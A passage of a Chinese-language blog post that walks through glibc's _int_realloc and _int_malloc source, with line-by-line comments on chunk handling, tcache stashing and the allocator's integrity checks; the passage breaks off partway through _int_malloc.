<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_int_realloc (mstate av, mchunkptr oldp, INTERNAL_SIZE_T oldsize,</span><br><span class="line">         INTERNAL_SIZE_T nb)</span><br><span class="line">&#123;</span><br><span class="line">  mchunkptr        newp;            /* chunk to return */</span><br><span class="line">  INTERNAL_SIZE_T  newsize;         /* its size */</span><br><span class="line">  void*          newmem;          /* corresponding user mem */</span><br><span class="line"></span><br><span class="line">  mchunkptr        next;            /* next contiguous chunk after oldp */</span><br><span class="line"></span><br><span class="line">  mchunkptr        remainder;       /* extra space at end of newp */</span><br><span class="line">  unsigned long    remainder_size;  /* its size */</span><br><span class="line"></span><br><span class="line">  /* oldmem size */</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (oldp) &lt;= CHUNK_HDR_SZ, 0)  //检查oldp的大小是否小于等于chunk头大小 如果小于等于 那么oldp明显不正常</span><br><span class="line">      || __builtin_expect (oldsize &gt;= av-&gt;system_mem, 0))  //检查oldsize是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid old size&quot;);</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, oldp);  //检查oldp指向的内存块是否处于使用中</span><br><span class="line"></span><br><span class="line">  /* All callers already filter out mmap&#x27;ed chunks.  */</span><br><span class="line">  assert (!chunk_is_mmapped (oldp));   //前面已经处理干净了mmap分配的内存块 这里检查一下</span><br><span class="line"></span><br><span class="line">  next = chunk_at_offset (oldp, oldsize);  //获取下一个内存块</span><br><span class="line">  INTERNAL_SIZE_T nextsize = chunksize (next);  //获取下一个内存块的大小</span><br><span class="line">  if (__builtin_expect (chunksize_nomask (next) &lt;= CHUNK_HDR_SZ, 0)  //检查下一个内存块的大小是否小于等于chunk头大小</span><br><span class="line">      || __builtin_expect (nextsize &gt;= av-&gt;system_mem, 0))  //检查下一个内存块的大小是否大于等于系统内存总量</span><br><span class="line">    malloc_printerr (&quot;realloc(): invalid next size&quot;);</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (oldsize) &gt;= (unsigned long) (nb))  //检查oldsize是否大于等于nb</span><br><span class="line">    &#123;</span><br><span class="line">      /* already big enough; split below */</span><br><span class="line">      newp = oldp;       //如果oldsize大于重分配的size 就不重新申请chunk 而是切割oldp</span><br><span class="line">      newsize = oldsize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      /* Try to expand forward into top */</span><br><span class="line">      if (next == av-&gt;top &amp;&amp;    //如果下一个chunk是top chunk 就扩展oldp</span><br><span class="line">          (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">          (unsigned long) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          set_head_size (oldp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">          av-&gt;top = chunk_at_offset (oldp, nb);</span><br><span class="line">          set_head (av-&gt;top, (newsize - nb) | PREV_INUSE);</span><br><span class="line">          check_inuse_chunk (av, oldp);</span><br><span class="line">          return tag_new_usable (chunk2mem (oldp));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* Try to expand forward into next chunk;  split off remainder below */</span><br><span class="line">      else if (next != av-&gt;top &amp;&amp;   //如果下一个chunk(free状态)的大小和oldpsize加起来大于等于nb 就合并oldp和nextchunk 然后重分配</span><br><span class="line">               !inuse (next) &amp;&amp;</span><br><span class="line">               (unsigned long) (newsize = oldsize + nextsize) &gt;=</span><br><span class="line">               (unsigned long) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          newp = oldp;</span><br><span class="line">          unlink_chunk (av, next);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      /* allocate, copy, free */</span><br><span class="line">      else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">          void *oldmem = chunk2mem (oldp);</span><br><span class="line">          size_t sz = memsize (oldp);</span><br><span class="line">          (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">          newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">          memcpy (newmem, oldmem, sz);</span><br><span class="line">          _int_free (av, oldp, 1); </span><br><span class="line">          check_inuse_chunk (av, newp); </span><br><span class="line">          return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* If possible, free extra space in old or extended chunk */</span><br><span class="line"></span><br><span class="line">  assert ((unsigned long) (newsize) &gt;= (unsigned long) (nb));  //判断重分配后的chunk大小是否大于需要分配的大小 即检测是否有多余的空间</span><br><span class="line"></span><br><span class="line">  remainder_size = newsize - nb;</span><br><span class="line"></span><br><span class="line">  if (remainder_size &lt; MINSIZE)   /* not enough extra to split off */</span><br><span class="line">    &#123;   //如果剩余的空间小于最小的chunk大小 那么就设置一些chunk的基础信息然后返回</span><br><span class="line">      set_head_size (newp, newsize | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_inuse_bit_at_offset (newp, newsize);</span><br><span class="line">    &#125;</span><br><span class="line">  else   /* split remainder */</span><br><span class="line">    &#123;  //相反 如果有多余的空间 就切割出来为新的chunk</span><br><span class="line">      remainder = chunk_at_offset (newp, nb);</span><br><span class="line">      /* Clear any user-space tags before writing the header.  */</span><br><span class="line">      remainder = tag_region (remainder, remainder_size);</span><br><span class="line">      set_head_size (newp, nb | (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      /* Mark remainder as inuse so free() won&#x27;t complain */</span><br><span class="line">      set_inuse_bit_at_offset (remainder, remainder_size);</span><br><span class="line">      _int_free (av, remainder, 1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk (av, newp);</span><br><span class="line">  return tag_new_usable (chunk2mem (newp));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>int_realloc的主要逻辑都是通过下面这个if分支来 这里着重来分析一波</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">else  //如果上述的特殊情况都不满足 就按照malloc-copy-free的流程来</span><br><span class="line">        &#123;</span><br><span class="line">          newmem = _int_malloc (av, nb - MALLOC_ALIGN_MASK);</span><br><span class="line">          if (newmem == 0)</span><br><span class="line">            return 0; /* propagate failure */</span><br><span class="line"></span><br><span class="line">          newp = mem2chunk (newmem);</span><br><span class="line">          newsize = chunksize (newp);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             Avoid copy if newp is next chunk after oldp.</span><br><span class="line">           */</span><br><span class="line">          if (newp == next)  //这里比较疑惑 用于检测newp是不是next chunk 如果是的话就按照合并oldp和next chunk算 但是正常来说 前面已经处理过这种情况了</span><br><span class="line">            &#123;</span><br><span class="line">              newsize += oldsize;</span><br><span class="line">              newp = oldp;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">          void *oldmem = chunk2mem (oldp);</span><br><span class="line">          size_t sz = memsize (oldp);</span><br><span class="line">          (void) tag_region (oldmem, sz);  //标记旧内存区域</span><br><span class="line">          newmem = tag_new_usable (newmem);  //标记新内存区域可用</span><br><span class="line">          memcpy (newmem, oldmem, sz);</span><br><span class="line">          _int_free (av, oldp, 1); </span><br><span class="line">          check_inuse_chunk (av, newp); </span><br><span class="line">          return newmem; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>开头先调用int_malloc(注意 这里是int_malloc 正如realloc一样 malloc也有int和libc两种形式 一般我们通过程序调用的是libc_malloc 所以就会出现 之前发现的明明tcachebin中有合适的chunk 但是却不会申请到了 具体是哪里的分支绕走了 又如何解决 还需要接着往下分析)<br>接下来进行了一个check 检测new_chunk就是next_chunk 但是在此之前 已经单独对next_chunk是否可以用来扩展old_chunk做了判断 这里的if是为了避免int_malloc后 next_chunk变得可用了 而做的异常处理 不过这是为了防止啥样的特殊情况 我也想象不出来 希望在阅读int_malloc后能够得到结论<br>然后就是标准的copy-free了 由于free在实验过程中没有出现特别显著的问题 所以就先不看int_free的源码了 来看看int_malloc和libc_malloc有什么不同</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               /* normalized request size */</span><br><span class="line">  unsigned int idx;                 /* associated bin index */</span><br><span class="line">  mbinptr bin;                      /* associated bin */</span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 /* inspected/selected chunk */</span><br><span class="line">  INTERNAL_SIZE_T size;             /* its size */</span><br><span class="line">  int victim_index;                 /* its bin index */</span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              /* remainder from a split */</span><br><span class="line">  unsigned long remainder_size;     /* its size */</span><br><span class="line"></span><br><span class="line">  unsigned int block;               /* bit map traverser */</span><br><span class="line">  unsigned int bit;                 /* bit map traverser */</span><br><span class="line">  unsigned int map;                 /* current word of binmap */</span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    /* misc temp for linking */</span><br><span class="line">  mchunkptr bck;                    /* misc temp for linking */</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE</span><br><span class="line">  size_t tcache_unsorted_count;        /* count of unsorted chunks processed */</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="line">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="line">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="line">     size. Also, checked_request2size returns false for request sizes</span><br><span class="line">     that are so large that they wrap around zero when padded and</span><br><span class="line">     aligned.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  if (!checked_request2size (bytes, &amp;nb))  //将请求的内存大小bytes加上chunk的头部大小</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (ENOMEM);</span><br><span class="line">      return NULL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="line">     mmap.  */</span><br><span class="line">  if (__glibc_unlikely (av == NULL))  //如果没有可用的内存分配区 调用sysmalloc通过mmap分配</span><br><span class="line">    &#123;</span><br><span class="line">      void *p = sysmalloc (nb, av);</span><br><span class="line">      if (p != NULL)</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="line">     This code is safe to execute even if av is not yet initialized, so we</span><br><span class="line">     can try it without checking, which saves some time on this fast path.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">#define REMOVE_FB(fb, victim, pp)            \</span><br><span class="line">  do                            \</span><br><span class="line">    &#123;                            \  //从fastbin中取出chunk</span><br><span class="line">      victim = pp;                    \</span><br><span class="line">      if (victim == NULL)                \</span><br><span class="line">    break;						\</span><br><span class="line">      pp = REVEAL_PTR (victim-&gt;fd);                                     \</span><br><span class="line">      if (__glibc_unlikely (pp != NULL &amp;&amp; misaligned_chunk (pp)))       \ //安全性检查 判断指针是否为空 是否对齐</span><br><span class="line">    malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected&quot;); \</span><br><span class="line">    &#125;                            \</span><br><span class="line">  while ((pp = catomic_compare_and_exchange_val_acq (fb, pp, victim)) \</span><br><span class="line">     != victim);					\</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))  //判断请求的大小是否处于fastbin的范围内</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx); //获取fastbin链表头</span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;</span><br><span class="line"></span><br><span class="line">      if (victim != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (__glibc_unlikely (misaligned_chunk (victim)))</span><br><span class="line">        malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 2&quot;);</span><br><span class="line"></span><br><span class="line">      if (SINGLE_THREAD_P)</span><br><span class="line">        *fb = REVEAL_PTR (victim-&gt;fd);</span><br><span class="line">      else</span><br><span class="line">        REMOVE_FB (fb, pp, victim); //多线程时从fastbin中取出chunk</span><br><span class="line">      if (__glibc_likely (victim != NULL))  //安全性检查</span><br><span class="line">        &#123;</span><br><span class="line">          size_t victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">          if (__builtin_expect (victim_idx != idx, 0))</span><br><span class="line">        malloc_printerr (&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE  //这一部分就是以前学过的tcache stash机制 在fastbin中申请chunk后 如果链表中还有free chunk 就会把这些chunk放到tcachebin中</span><br><span class="line">          /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">         stash them in the tcache.  */</span><br><span class="line">          size_t tc_idx = csize2tidx (nb);</span><br><span class="line">          if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count  //如果tcache对应size的链表还有空余 就转移chunk</span><br><span class="line">             &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">            &#123;</span><br><span class="line">              if (__glibc_unlikely (misaligned_chunk (tc_victim)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unaligned fastbin chunk detected 3&quot;);</span><br><span class="line">              if (SINGLE_THREAD_P)</span><br><span class="line">            *fb = REVEAL_PTR (tc_victim-&gt;fd);</span><br><span class="line">              else</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">              if (__glibc_unlikely (tc_victim == NULL))</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span><br><span class="line">     hold one size each, no searching within bins is necessary.</span><br><span class="line">     (For a large request, we need to wait until unsorted chunks are</span><br><span class="line">     processed to find best fit. But for small ones, fits are exact</span><br><span class="line">     anyway, so we can check now, which is faster.)</span><br><span class="line">   */</span><br><span class="line">  //先在smallbin中查询可用chunk 因为smallbin链表类似tcachebin 每个size都有一个链表 查询起来速度快</span><br><span class="line">  if (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);  //获取smallbin的链表头</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;   //取链表的最后一个chunk的上一个chunk</span><br><span class="line">      if (__glibc_unlikely (bck-&gt;fd != victim))   //安全性检查 如果bck的下一个chunk不是victim 说明链表被破坏</span><br><span class="line">        malloc_printerr (&quot;malloc(): smallbin double linked list corrupted&quot;);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;  //将链表中的最后一个chunk拿去使用 随后恢复链表结构</span><br><span class="line">          bck-&gt;fd = bin; </span><br><span class="line"></span><br><span class="line">          if (av != &amp;main_arena) //如果分配区不是main_arena 设置chunk的arena为非main_arena</span><br><span class="line">        set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">    //和fastbin中一样 如果smallbin中链表还有其他free chunk 且符合tcachebin的范围 同时tcachebin中有空闲位置 就全部放到tcachebin中</span><br><span class="line">      /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">         stash them in the tcache.  */</span><br><span class="line">      size_t tc_idx = csize2tidx (nb);</span><br><span class="line">      if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">             &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          if (tc_victim != 0)</span><br><span class="line">            &#123;</span><br><span class="line">              bck = tc_victim-&gt;bk;</span><br><span class="line">              set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">            set_non_main_arena (tc_victim);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              tcache_put (tc_victim, tc_idx);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     If this is a large request, consolidate fastbins before continuing.</span><br><span class="line">     While it might look excessive to kill all fastbins before</span><br><span class="line">     even seeing if there is space available, this avoids</span><br><span class="line">     fragmentation problems normally associated with fastbins.</span><br><span class="line">     Also, in practice, programs tend to have runs of either small or</span><br><span class="line">     large requests, but less often mixtures, so consolidation is not</span><br><span class="line">     invoked all that often in most programs. And the programs that</span><br><span class="line">     it is called frequently in otherwise tend to fragment.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line">    &#123;   //如果是从largebin中分配 就会触发malloc_consolidate来合并chunk 这个以前也有学过</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      if (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     Process recently freed or remaindered chunks, taking one only if</span><br><span class="line">     it is exact fit, or, if this a small request, the chunk is remainder from</span><br><span class="line">     the most recent non-exact fit.  Place other traversed chunks in</span><br><span class="line">     bins.  Note that this step is the only place in any routine where</span><br><span class="line">     chunks are placed in bins.</span><br><span class="line"></span><br><span class="line">     The outer loop here is needed because we might not realize until</span><br><span class="line">     near the end of malloc that we should have consolidated, so must</span><br><span class="line">     do so and retry. This happens at most once, and only when we would</span><br><span class="line">     otherwise need to expand memory to service a &quot;small&quot; request.</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">#if USE_TCACHE </span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = 0;</span><br><span class="line">  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)  //判断请求大小是否属于tcachebin的范围</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  int return_cached = 0;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = 0;</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  for (;; )</span><br><span class="line">    &#123;</span><br><span class="line">      int iters = 0;</span><br><span class="line">      //判断链表头的上一个chunk是否为链表头本身 如果是 那么链表中无空闲chunk 不进入while循环</span><br><span class="line">      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;  //获取链表中的最后一个chunk</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size); //获取victim下一个相邻chunk的地址</span><br><span class="line">          if (__glibc_unlikely (size &lt;= CHUNK_HDR_SZ)   //安全性检查</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (chunksize_nomask (next) &lt; CHUNK_HDR_SZ)  //检查下一个chunk的size是否符合要求</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))  //检查next_chunk的prev_size是否正确</span><br><span class="line">            malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;);</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim)  //检查链表结构</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">          if (__glibc_unlikely (prev_inuse (next))) //检查next_chunk的prev_inuse位是否为0</span><br><span class="line">            malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br><span class="line"></span><br><span class="line">          /*</span><br><span class="line">             If a small request, try to use last remainder if it is the</span><br><span class="line">             only chunk in unsorted bin.  This helps promote locality for</span><br><span class="line">             runs of consecutive small requests. This is the only</span><br><span class="line">             exception to best-fit, and applies only when there is</span><br><span class="line">             no exact fit for a small chunk.</span><br><span class="line">           */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (nb) &amp;&amp;   //如果请求大小属于small chunk 同时victim的size大于申请的size </span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;   //这一点要注意 check的是bck和main_arena中对应链表的指针 如果是通过填满tcache来把chunk释放进入unsortedbin的方式 还需要先随便申请一个小chunk才能触发这个if分支 具体原因就是第一次申请chunk的时候 unsorted_chunks(av)的值为0</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              /* split and reattach remainder */</span><br><span class="line">              remainder_size = size - nb;   //从剩余的空间中分割chunk</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              if (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = NULL;</span><br><span class="line">                  remainder-&gt;bk_nextsize = NULL;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* remove from unsorted list */</span><br><span class="line">          if (__glibc_unlikely (bck-&gt;fd != victim))  //安全性检查</span><br><span class="line">            malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck; </span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          /* Take now instead of binning if exact fit */</span><br><span class="line"></span><br><span class="line">          if (size == nb)  //如果申请的chunk大小和剩余的大小一致 就走这个分支</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              if (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena (victim);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">          /* Fill cache first, return to user only if cache fills.</span><br><span class="line">         We may return one of these chunks later.  */</span><br><span class="line">          if (tcache_nb            //如果有tcachebin 就先把这个chunk放到tcachebin中</span><br><span class="line">          &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">        &#123;</span><br><span class="line">          tcache_put (victim, tc_idx);</span><br><span class="line">          return_cached = 1;</span><br><span class="line">          continue;</span><br><span class="line">        &#125;</span><br><span class="line">          else</span><br><span class="line">        &#123;</span><br><span class="line">#endif</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              void *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              return p;</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          /* place chunk in bin */</span><br><span class="line"></span><br><span class="line">          if (in_smallbin_range (size))   //这里根据chunk的大小来判断要放入smallbin还是largebin</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              /* maintain large bins in sorted order */  //这一段是largebin按照大小排序的部分</span><br><span class="line">              if (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">              &lt; (unsigned long) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  else</span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      while ((unsigned long) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">              assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      if ((unsigned long) size</span><br><span class="line">              == (unsigned long) chunksize_nomask (fwd))</span><br><span class="line">                        /* Always insert in the second position.  */</span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      else</span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">                            malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                      if (bck-&gt;fd != fwd)</span><br><span class="line">                        malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              else</span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line">#if 